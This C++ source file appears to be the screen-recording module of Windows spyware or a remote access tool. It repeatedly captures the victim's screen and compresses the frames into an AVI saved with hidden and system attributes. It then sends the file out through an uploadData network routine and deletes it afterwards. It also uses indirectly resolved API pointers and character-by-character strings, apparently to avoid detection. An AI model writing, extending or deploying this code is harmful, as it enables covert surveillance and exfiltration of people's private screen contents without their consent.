#include <Windows.h>
#include "../api.h"
#include "../public.h"
#include "ScreenSnapshot.h"
#include "Screenvideo.h"
#include "../network/NetWorkdata.h"
#include "zconf.h"
#include "zlib.h"
#include "../log.h"
#include "GetScreenFrame.h"
#include "../log.h"
#include "../StrHelper.h"

#pragma comment(lib,"zlib.lib")
#pragma comment(lib, "GdiPlus.lib")

using namespace Gdiplus;
using namespace std;
class GdiPlusIniter
{
public:
	GdiPlusIniter()
	{
		GdiplusStartupInput StartupInput;
		lpGdiplusStartup(&m_gdiplusToken, &StartupInput, NULL);
	}

	~GdiPlusIniter()
	{
		lpGdiplusShutdown(m_gdiplusToken);
	}
private:
	ULONG_PTR m_gdiplusToken;
};
//need to initialize the Gdiplus object,else the function in screenshot will be in error


int SendScreenVideo(char* szAviName)
{
	HANDLE hFile = lpCreateFileA(szAviName, GENERIC_WRITE | GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	int iRet = lpSetFilePointer(hFile, 0, 0, FILE_BEGIN);
	if (iRet == INVALID_SET_FILE_POINTER)
	{
		lpCloseHandle(hFile);
		return FALSE;
	}

	DWORD dwFileSizeHigh = 0;
	DWORD dwFileSize = lpGetFileSize(hFile, &dwFileSizeHigh);

	DWORD dwCnt = 0;
	char* lpBuf = new char[dwFileSize + 0x1000];
	if (lpBuf == 0)
	{
		lpCloseHandle(hFile);
		return FALSE;
	}

	iRet = lpReadFile(hFile, lpBuf, dwFileSize, &dwCnt, 0);
	lpCloseHandle(hFile);
	if (iRet && dwCnt == dwFileSize)
	{
		// 		char * lpZlibBuf = new char [MAX_ZLIB_BUFFER_SIZE];
		// 		if(lpZlibBuf)
		// 		{
		// 			long lSrcBufLen = dwFileSize;
		// 			long lZlibBufLen = MAX_ZLIB_BUFFER_SIZE;
		// 			int iRet = compress((Bytef*)lpZlibBuf, (uLongf*)&lZlibBufLen, (const Bytef*)lpBuf, (uLongf)lSrcBufLen);
		// 			if (iRet == Z_OK)
		// 			{
		// 				iRet = uploadData(lpZlibBuf,lZlibBufLen,SCREENVIDEO,szAviName);
		// 			}
		// 			delete []lpZlibBuf;
		// 		}
		iRet = uploadData(lpBuf, dwFileSize, SCREENVIDEO, szAviName);
	}

	delete[] lpBuf;

#ifndef _DEBUG
	lpDeleteFileA(szAviName);
#endif
	return TRUE;
}




int __stdcall GetScreenVideo(unsigned long TimeLast)
{
	unsigned long iTimeLast = TimeLast * 1000;
	unsigned long iTimeDelay = 1000 / SCREEN_VIDEO_FRAMES_PER_SECOND;
	unsigned long iTotalFrames = iTimeLast / iTimeDelay;
	unsigned long iFrameCnt = 0;
	PAVIFILE pAviFile = 0;
	AVISTREAMINFOA stAviStreamInfo = { 0 };
	PAVISTREAM pAviStream = 0;
	PAVISTREAM pAviCom = 0;
	PAVISTREAM pCompressedStream = 0;
	char szAviName[MAX_PATH] = { 0 };

	HIC hIc = lpICOpen(ICTYPE_VIDEO, mmioFOURCC('m', 's', 'v', 'c'), ICMODE_COMPRESS);
	if (hIc == FALSE)
	{
		return FALSE;
	}
	//int iRet = lpRtlGetLastWin32Error();
	DWORD dwIcSize = lpICSendMessage(hIc, ICM_GETSTATE, 0, 0);
	int iRet = lpICClose(hIc);

	char szParams[16] = { 0 };
	char szFormat[16] = { 0 };


	lpAVIFileInit();
	GdiPlusIniter GdiPlusIniterGlobal;

	char szScreenDCName[] = { 'D','I','S','P','L','A','Y',0 };



	try
	{
		while (TRUE)
		{
			//check if is in screen save state
			int  iParam = 1;
			lpSystemParametersInfoA(SPI_GETSCREENSAVERRUNNING, 0, (PVOID)&iParam, 0);
			if (iParam)
			{
				//writeLog("screen is sleeping\r\n");
				lpSleep(iTimeDelay);
				continue;
			}


			int dwbmbitssize = 0;
			char* pixelData = 0;
			char* lpBuf = lpGlobalAlloc(GPTR, BMP_STREAM_SIZE);
			int dwBufSize = GetScreenFrame(BITSPERPIXEL, szScreenDCName, 0, 0, ScrnResolutionX, ScrnResolutionY, lpBuf, &pixelData, &dwbmbitssize);
			if (dwBufSize == FALSE)
			{
				lpSleep(iTimeDelay);
				continue;
			}


			IStream* istrBmp = NULL;
			IStream* istrJpg = NULL;
			iRet = _lpCreateStreamOnHGlobal(lpBuf, FALSE, &istrBmp);
			Bitmap stBmp(istrBmp);


			EncoderParameters encoderParameters;
			CLSID jpgClsid;
			//char szusJpgFormat[]	= {'i',0,'m',0,'a',0,'g',0,'e',0,'/',0,'j',0,'p',0,'e',0,'g',0,0,0};
			char szusJpgFormat[] = { 'i',0,'m',0,'a',0,'g',0,'e',0,'/',0,'b',0,'m',0,'p',0,0,0 };
			if (GetEncoderClsid((const WCHAR*)szusJpgFormat, &jpgClsid) == -1)
			{
				writeLog("GetScreenVideo GetEncoderClsid error\r\n");
				lpSleep(iTimeDelay);
				continue;
			}
			encoderParameters.Count = 1;
			encoderParameters.Parameter[0].Guid = EncoderCompression;  //old value is EncoderQuality
			encoderParameters.Parameter[0].Type = EncoderParameterValueTypeShort;  //EncoderParameterValueTypeLong
			encoderParameters.Parameter[0].NumberOfValues = 1;

			ULONG quality = JPG_TRANSFORM_QUALITY;
			encoderParameters.Parameter[0].Value = &quality;

			char* lpJpg = lpGlobalAlloc(GPTR, JPG_STREAM_SIZE);
			iRet = _lpCreateStreamOnHGlobal(lpJpg, FALSE, &istrJpg);

			Status status = stBmp.Save(istrJpg, &jpgClsid, &encoderParameters);
			if (status == 0)
			{
				if (*lpJpg == 'B' && *(lpJpg + 1) == 'M')
				{
					BITMAPFILEHEADER* bmpFileHdr = (BITMAPFILEHEADER*)lpJpg;
					BITMAPINFOHEADER* bmpInfoHdr = (BITMAPINFOHEADER*)(lpJpg + sizeof(BITMAPFILEHEADER));
					if (bmpInfoHdr->biBitCount == 0 || bmpInfoHdr->biHeight == 0 || bmpInfoHdr->biWidth == 0 || bmpInfoHdr->biSize != sizeof(BITMAPINFOHEADER))
					{
						writeLog("GetScreenVideo bmpInfoHdr error\r\n");
						goto VideoEnd;
					}
					if (bmpInfoHdr->biPlanes == 0 || bmpInfoHdr->biSizeImage == 0)
					{
						bmpInfoHdr->biPlanes = 1;
						bmpInfoHdr->biSizeImage = bmpInfoHdr->biWidth * bmpInfoHdr->biHeight * bmpInfoHdr->biBitCount / 8;
					}
					else if (bmpInfoHdr->biCompression != BI_RGB)
					{
						bmpInfoHdr->biCompression = BI_RGB;
					}
					else if (bmpInfoHdr->biBitCount % 8)
					{
						bmpInfoHdr->biBitCount = BITSPERPIXEL;
					}

					HRESULT hResult = 0;
					if (iFrameCnt == 0)
					{
						SYSTEMTIME stSt;
						lpGetLocalTime(&stSt);
						char strFileName[MAX_PATH];
						lpwsprintfA(strFileName, SCREENVIDEO_RECORD_FILENAME, stSt.wYear, stSt.wMonth, stSt.wDay, stSt.wHour, stSt.wMinute, stSt.wSecond);

						int iRet = makeFullFileName(szAviName, strFileName);
						hResult = lpAVIFileOpenA(&pAviFile, szAviName, OF_WRITE | OF_CREATE | OF_READ, NULL);
						if (hResult != S_OK)
						{
							writeLog("GetScreenVideo AVIFileOpenA error\r\n");
							goto ScreenVideoErrorInAviStreamInit;
						}
						lpRtlZeroMemory((char*)&stAviStreamInfo, sizeof(AVISTREAMINFOA));
						stAviStreamInfo.dwFlags = AVICOMPRESSF_KEYFRAMES | AVICOMPRESSF_VALID;
						stAviStreamInfo.fccType = streamtypeVIDEO;
						stAviStreamInfo.fccHandler = mmioFOURCC('M', 'S', 'V', 'C');
						stAviStreamInfo.dwScale = 1;
						stAviStreamInfo.dwRate = SCREEN_VIDEO_FRAMES_PER_SECOND;
						stAviStreamInfo.dwSuggestedBufferSize = bmpInfoHdr->biSizeImage;
						stAviStreamInfo.dwQuality = AVI_VIDEO_QUALITY;		//0~10000
						stAviStreamInfo.rcFrame.left = 0;
						stAviStreamInfo.rcFrame.top = 0;
						stAviStreamInfo.rcFrame.right = bmpInfoHdr->biWidth;
						stAviStreamInfo.rcFrame.bottom = bmpInfoHdr->biHeight;
						//stAviStreamInfo.szName					= {0};
						//strcpy_s(stAviStreamInfo.szName,MAX_PATH,szAviName);		//sizeof(stAviStreamInfo.szName)

						hResult = lpSetRect(&stAviStreamInfo.rcFrame, 0, 0, bmpInfoHdr->biWidth, bmpInfoHdr->biHeight);
						hResult = lpAVIFileCreateStreamA(pAviFile, &pAviStream, &stAviStreamInfo);
						if (hResult != S_OK)
						{
							writeLog("GetScreenVideo AVIFileCreateStreamA error\r\n");
							goto ScreenVideoErrorInAviStreamInit;
						}

						AVICOMPRESSOPTIONS  options[2] = { 0 };
						LPAVICOMPRESSOPTIONS  aoptions = &options[0];
						options[0].fccType = ICTYPE_VIDEO;
						//options[0].fccHandler=0x64697678;//xvid 1684633208 这个是fccHandler的值，可以从ICGetInfo中得到
						options[0].fccHandler = mmioFOURCC('m', 's', 'v', 'c');//mmioFOURCC('i','v','4','1');
						//opts.fccHandler=0x6376736d;//microsoft video 1 compression
						//opts.fccHandler=0x64697663;// for cinepak codec
						options[0].dwKeyFrameEvery = 0;
						options[0].dwQuality = AVI_VIDEO_QUALITY;
						options[0].dwBytesPerSecond = 0;
						options[0].dwFlags = 8;		//AVICOMPRESSF_KEYFRAMES;
						options[0].lpFormat = szFormat;
						options[0].cbFormat = 0;
						options[0].lpParms = szParams;
						options[0].cbParms = dwIcSize;
						options[0].dwInterleaveEvery = 0;

						// Step 5:  Create a compressed stream using codec options.
						hResult = lpAVIMakeCompressedStream(&pCompressedStream, pAviStream, (AVICOMPRESSOPTIONS*)&options[0], NULL);
						if (hResult != S_OK)
						{
							char szShowInfo[512];
							iRet = lpRtlGetLastWin32Error();
							lpwsprintfA(szShowInfo, "screenvideo lpAVIMakeCompressedStream error,error code is:%u\r\n", iRet);
							writeLog(szShowInfo);
							goto ScreenVideoErrorInAviStreamInit;
						}
					}

					hResult = lpAVIStreamSetFormat(pCompressedStream, 0, bmpInfoHdr, sizeof(BITMAPINFOHEADER));
					if (hResult)
					{
						char szShowInfo[512];
						iRet = lpRtlGetLastWin32Error();
						lpwsprintfA(szShowInfo, "screenvideo lpAVIStreamSetFormat error,error code is:%u\r\n", iRet);
						writeLog(szShowInfo);
						goto VideoEnd;
					}

					hResult = lpAVIStreamWrite(pCompressedStream, iFrameCnt, 1, lpJpg + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER), bmpInfoHdr->biSizeImage,
						AVIIF_KEYFRAME, NULL, NULL);
					if (hResult)
					{
						char szShowInfo[512];
						iRet = lpRtlGetLastWin32Error();
						lpwsprintfA(szShowInfo, "screenvideo lpAVIStreamWrite error,error code is:%u\r\n", iRet);
						writeLog(szShowInfo);
						goto VideoEnd;
					}
				}
			}
		VideoEnd:
			istrJpg->Release();
			istrBmp->Release();
			lpGlobalFree(lpBuf);
			lpGlobalFree(lpJpg);

			iFrameCnt++;
			if (iFrameCnt >= iTotalFrames)
			{
				iRet = lpAVIStreamRelease(pAviStream);
				if (pAviFile != NULL)
				{
					iRet = lpAVIFileRelease(pAviFile);
					iRet = lpAVIFileRelease(pAviFile);
				}

				lpAVIFileExit();

				SendScreenVideo(szAviName);
				return TRUE;
			}

			lpSleep(iTimeDelay);
			continue;

		ScreenVideoErrorInAviStreamInit:
			istrJpg->Release();
			istrBmp->Release();
			lpGlobalFree(lpBuf);
			lpGlobalFree(lpJpg);

			iRet = lpAVIStreamRelease(pAviStream);
			if (pAviFile != NULL)
			{
				iRet = lpAVIFileRelease(pAviFile);
				iRet = lpAVIFileRelease(pAviFile);
			}

			lpAVIFileExit();
			return FALSE;

		}
	}
	catch (...)
	{
		writeLog("GetScreenVideo exception\r\n");
		return FALSE;
	}
}
//screenshot end






/*
void AVItoBmp(char * strAVIFileName, char * strBmpDir)
{
	AVIFileInit();
	PAVIFILE avi;
	int res=AVIFileOpenA(&avi, strAVIFileName, OF_READ, NULL);
	int n = GetLastError();
	if (res!=AVIERR_OK)
	{
		if (avi!=NULL)
		AVIFileRelease(avi);
		return ;
	}
	AVIFILEINFO avi_info;
	AVIFileInfo(avi, &avi_info, sizeof(AVIFILEINFO));
	PAVISTREAM pStream;
	res=AVIFileGetStream(avi, &pStream, streamtypeVIDEO , 0 );
	if (res!=AVIERR_OK)
	{
		if (pStream!=NULL)
		AVIStreamRelease(pStream);
		AVIFileExit();
		return ;
	}

	//do some task with the stream
	int iNumFrames;
	int iFirstFrame;
	iFirstFrame=AVIStreamStart(pStream);
	if (iFirstFrame==-1)
	{
		//Error getteing the frame inside the stream
		if (pStream!=NULL)
			AVIStreamRelease(pStream);
		AVIFileExit();
		return ;
	}
	iNumFrames=AVIStreamLength(pStream);
	if (iNumFrames==-1)
	{
		//Error getteing the number of frames inside the stream
		if (pStream!=NULL)
		AVIStreamRelease(pStream);
		AVIFileExit();
		return ;
	}

	//getting bitmap from frame
	BITMAPINFOHEADER bih;
	ZeroMemory(&bih, sizeof(BITMAPINFOHEADER));

	bih.biBitCount=24; //24 bit per pixel
	bih.biClrImportant=0;
	bih.biClrUsed = 0;
	bih.biCompression = BI_RGB;
	bih.biPlanes = 1;
	bih.biSize = 40;
	bih.biXPelsPerMeter = 0;
	bih.biYPelsPerMeter = 0;
	//calculate total size of RGBQUAD scanlines (DWORD aligned)
	bih.biSizeImage = (((bih.biWidth * 3) + 3) & 0xFFFC) * bih.biHeight ;

	PGETFRAME pFrame;
	pFrame=AVIStreamGetFrameOpen(pStream, NULL );

	AVISTREAMINFO streaminfo;
	AVIStreamInfo(pStream,&streaminfo,sizeof(AVISTREAMINFO));

	//Get the first frame
	BITMAPINFOHEADER bih2;
	long lsize = sizeof(bih2);
	int index=0;
	for (int i=iFirstFrame; i<iNumFrames; i++)
	{
		index= i-iFirstFrame;
		BYTE* pDIB = (BYTE*) AVIStreamGetFrame(pFrame, index); //
		AVIStreamReadFormat(pStream,index,&bih2,&lsize);
		BITMAPFILEHEADER stFileHdr;
		BYTE* Bits=new BYTE[bih2.biSizeImage];
		AVIStreamRead(pStream,index,1,Bits,bih2.biSizeImage,NULL,NULL);
		//RtlMoveMemory(Bits, pDIB + sizeof(BITMAPINFOHEADER), bih2.biSizeImage);

		bih2.biClrUsed =0;
		stFileHdr.bfOffBits=sizeof(BITMAPFILEHEADER)+sizeof(BITMAPINFOHEADER);
		stFileHdr.bfSize=sizeof(BITMAPFILEHEADER);
		stFileHdr.bfType=0x4d42;
		char  FileName[MAX_PATH];
		wsprintfA(FileName,"Frame-%05d.bmp", index);
		string strtemp = strBmpDir;
		strtemp += "\\";
		strtemp += FileName;
		FILE* fp= fopen(strtemp.c_str() ,"wb");
		fwrite(&stFileHdr,1,sizeof(BITMAPFILEHEADER),fp);
		fwrite(&bih2,1,sizeof(BITMAPINFOHEADER),fp);
		int ff = fwrite(Bits,1,bih2.biSizeImage,fp);
		int e = GetLastError();
		fclose(fp);
		/////
		delete Bits;
		//CreateFromPackedDIBPointer(pDIB, index);
	}

	AVIStreamGetFrameClose(pFrame);

	//close the stream after finishing the task
	if (pStream!=NULL)
	AVIStreamRelease(pStream);
	AVIFileExit();
}
*/